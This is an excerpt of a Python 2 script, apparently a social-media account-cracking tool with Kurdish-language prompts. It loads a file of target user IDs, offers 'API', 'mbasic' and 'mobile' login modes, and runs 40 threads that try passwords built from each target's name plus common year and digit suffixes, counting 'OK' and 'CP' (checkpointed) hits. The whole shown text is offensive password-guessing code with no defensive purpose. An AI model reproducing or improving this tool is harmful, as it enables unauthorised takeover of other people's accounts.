...
def teman(sultani):
    ...
    try:
        mmk = raw_input('%s[%s\x1b[1;92m?%s] nawy file  : \x1b[1;92m' % (N, O, N))
        asw = raw_input(' %s[%s\x1b[1;92m?%s] hamu id   : \x1b[1;92m' % (N, O, N))
...
class __crack__():
        ...
        if ___mking__pass___ in ('2', '02'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    print '\x1b[1;97m-------------------------------------------------'
                    print '[%s\x1b[1;92m1%s].  API (fast)' % (O, N)
                    print '[%s\x1b[1;92m2%s].  mbasic (slow)' % (O, N)
                    print '[%s\x1b[1;92m3%s].  mobile (super slow)' % (O, N)
                    print '\x1b[1;97m-------------------------------------------------'
                    __yan__(pwek.split(','))
                    break
    ...
    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mMK\xe2\x99\xa1S%s] TEST %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            with mking__pass(max_workers=40) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '2001', xz[0] + '1234567890', xz[0] + '1213', xz[0] + '1999', xz[0] + '2000', xz[0] + '2006', xz[0] + '2004', xz[0] + '2005' '1234554321', '1122334455', '12345678900', xz[0] + '2007', xz[0] + '2001', xz[0] + '2002', xz[0] + '2003', xz[0] + '1999', xz[0] + '123123', '09876554321', '12341234', '11223344', '11111111', '00000000', '88888888', '123123123', xz[0] + '1212', '1234567890', xz[0] + '4321', xz[0] + '2008','1234512345', '11111111', '22222222', '33333333', '55555555', '44444444', '12121212']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '2001', xz[0] + '1234567890', xz[0] + '1213', xz[0] + '1999', xz[0] + '2000', xz[0] + '2006', xz[0] + '2004', xz[0] + '2005' '1234554321', '1122334455', '12345678900', xz[0] + '2007', xz[0] + '2001', xz[0] + '2002', xz[0] + '2003', xz[0] + '1999', xz[0] + '123123', '09876554321', '12341234', '11223344', '11111111', '00000000', '88888888', '123123123', xz[0] + '1212', '1234567890', xz[0] + '4321', xz[0] + '2008','1234512345', '11111111', '22222222', '33333333', '55555555', '44444444', '12121212', xz[0] + '78']
